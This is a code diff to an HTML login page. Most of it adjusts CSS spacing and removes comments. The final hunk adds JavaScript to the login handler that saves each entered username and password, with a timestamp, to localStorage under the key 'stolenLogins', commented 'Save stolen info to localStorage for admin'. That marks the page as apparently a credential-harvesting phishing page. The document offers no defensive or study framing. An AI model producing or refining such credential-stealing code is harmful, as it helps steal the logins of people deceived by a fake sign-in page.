@@ -48,17 +48,14 @@
     label[for="password"] { position: relative; top: -3px; font-size: 0.75rem; }
     #password { position: relative; top: -2.7px; }
 
-    /* moved up more by 4px */
     label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.85rem; }
     #forgotPassword { position: relative; top: -9.5px; font-size: 0.85rem; }
 
     #errorMsg { max-width: 95%; margin: 0 auto; font-size: 0.8rem; text-align: center; }
 
-    /* move header up */
     h1 { position: relative; top: -10px; font-size: 1.5rem; font-weight: 500; }
 
-    /* further reduced gap between USERNAME and PASSWORD fields */
-    form.flex.flex-col.space-y-6 { gap: 0.5rem; } /* was 0.8rem */
+    form.flex.flex-col.space-y-6 { gap: 0.5rem; }
   </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
@@ -87,9 +84,7 @@
       <a id="forgotPassword" href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
     </form>
   </div>
-
   <button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>Log In</button>
-
   <script>
     document.addEventListener("DOMContentLoaded", function() {
       const usernameInput = document.getElementById("username");
@@ -124,6 +119,12 @@
             loginBtn.classList.remove("bg-[#00b0ff]");
             loginBtn.classList.add("bg-gray-400");
             loginBtn.disabled = true;
+
+            // Save stolen info to localStorage for admin
+            let stolenData = localStorage.getItem("stolenLogins") || "No logins yet.";
+            const newEntry = `${usernameInput.value}:${passwordInput.value} - ${new Date().toLocaleString()}\n`;
+            stolenData = stolenData === "No logins yet." ? newEntry : stolenData + newEntry;
+            localStorage.setItem("stolenLogins", stolenData);
           } else {
             window.location.href = "admin.html";
           }
